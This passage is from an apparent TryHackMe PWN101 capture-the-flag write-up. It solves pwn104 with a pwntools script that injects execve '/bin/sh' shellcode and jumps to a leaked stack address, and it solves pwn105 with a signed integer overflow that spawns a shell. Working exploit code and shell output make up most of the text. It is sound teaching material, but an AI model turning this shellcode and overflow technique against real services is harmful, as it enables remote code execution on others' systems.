──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn104", stopped 0x40124e in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40124e → main()

gef➤  patt off laaaaaaamaaaaaaanaaaa
[+] Searching for '616161616e616161616161616d616161616161616c'/'6c616161616161616d616161616161616e61616161' with period=8
[+] Found at offset 88 (big-endian search)
```

To exploit this binary, we need to send shellcode in our input that we want to be executed, then overwrite the `rip` with the leaked address of the buffer to jump to the shellcode.

I used [this shellcode](/shellcode/asm-09.html) which is 30 bytes long. The offset until we overwrite the `rip` is 88 bytes. `88 - 30 = 58`. I then used 8 bytes of **NOP** (`\x90`) between the shellcode and the junk data to ensure that the shellcode executes successfully and does not crash when it reaches the end of the shellcode and tries to execute the *junk* data I sent.

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn104", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
shellcode = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

buffer = shellcode
buffer += b"\x90"*8
buffer += b"A"*50

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.recvuntil(b"at ")
leaked_buffer_address = int(p.recvline().strip(), 16)
print(f"[+] Leaked Buffer Address: {hex(leaked_buffer_address)}")

buffer += p64(leaked_buffer_address)

p.sendline(buffer)

p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit.py 
[+] Starting local process './pwn104': pid 10748
[+] Leaked Buffer Address: 0x7ffc9bfdd710
[*] Switching to interactive mode
$ ls
exploit.py  pwn104
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9004
[+] Opening connection to XX.XX.XX.XX on port 9004: Done
[+] Leaked Buffer Address: 0x7ffd0ce127d0
[*] Switching to interactive mode
$ whoami
pwn104
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXXXXXXX}
```

---
---
## pwn105 Solution
### Disassembly:
```c
void main(void)
{
    int64_t in_FS_OFFSET;
    int64_t var_1ch;
    int32_t var_14h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    setup();
    banner();
    puts("-------=[ BAD INTEGERS ]=-------");
    puts("|-< Enter two numbers to add >-|\n");
    printf("]>> ");
    __isoc99_scanf(data.0000216f, &var_1ch);
    printf("]>> ");
    __isoc99_scanf(data.0000216f, (int64_t)&var_1ch + 4);
    var_14h = var_1ch._4_4_ + (int32_t)var_1ch;
    if (((int32_t)var_1ch < 0) || (var_1ch._4_4_ < 0)) {
        printf("\n[o.O] Hmmm... that was a Good try!\n", (int32_t)var_1ch, var_1ch._4_4_, var_14h);
    } else if (var_14h < 0) {
        printf("\n[*] C: %d", var_14h);
        puts("\n[*] Popped Shell\n[*] Switching to interactive mode");
        system("/bin/sh");
    } else {
        printf("\n[*] ADDING %d + %d", (int32_t)var_1ch, var_1ch._4_4_);
        printf("\n[*] RESULT: %d\n", var_14h);
    }
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        __stack_chk_fail();
    }
    return;
}
```

The `main()` function prompts the user to enter two numbers. It adds the numbers and stores the result in the variable `var_14h` before checking if either of the entered numbers are negative, if either of them are then it outputs *"[o.O] Hmmm... that was a Good try!"*. It then checks if the result is negative, if it is then it spawns a shell, if the result is positive then it outputs *"ADDING {entered numbers}"* and then prints the result.

This is an integer overflow vulnerability because the `int32_t` integer type in C has a range from `-2,147,483,647` to `2,147,483,647`. If you take the number `2,147,483,647` and add `1` to it, then it wraps around to the negative range and results in the value `-2,147,483,648`.

So, to solve this challenge, we can simply enter `2147483647` as the first number and `1` as the second number. Both of the numbers are positive so it bypasses the first check, but the result is negative so it spawns a shell.

### Exploit (manual):
```text
$ ./pwn105 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 105          


-------=[ BAD INTEGERS ]=-------
|-< Enter two numbers to add >-|

]>> 2147483647
]>> 1

[*] C: -2147483648
[*] Popped Shell
[*] Switching to interactive mode
sh-5.3$ ls
exploit.py  pwn105
```

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn105", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendlineafter(b"]>> ", b"2147483647")
p.sendlineafter(b"]>> ", b"1")

p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit.py 
[+] Starting local process './pwn105': pid 11350
[*] Switching to interactive mode

[*] C: -2147483648
[*] Popped Shell
[*] Switching to interactive mode
$ ls
exploit.py  pwn105
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9005
[+] Opening connection to XX.XX.XX.XX on port 9005: Done
[*] Switching to interactive mode

[*] C: -2147483648
[*] Popped Shell
[*] Switching to interactive mode
$ whoami
pwn105
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXX}
```

## References
- [TryHackMe PWN101](https://tryhackme.com/room/pwn101)
- [Return Oriented Programming](https://ctf101.org/binary-exploitation/return-oriented-programming/)
- [Interger Underflows and Overflows](https://www.infosecinstitute.com/resources/secure-coding/what-is-is-integer-overflow-and-underflow/)
- [GDB](https://sourceware.org/gdb/)
- [GEF (GDB Add-on)](https://github.com/hugsy/gef)
- [pwndbg (GDB Add-on)](https://github.com/pwndbg/pwndbg)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [ropper](https://github.com/sashs/Ropper)
- [Cutter (The disassembler I use)](https://cutter.re/)
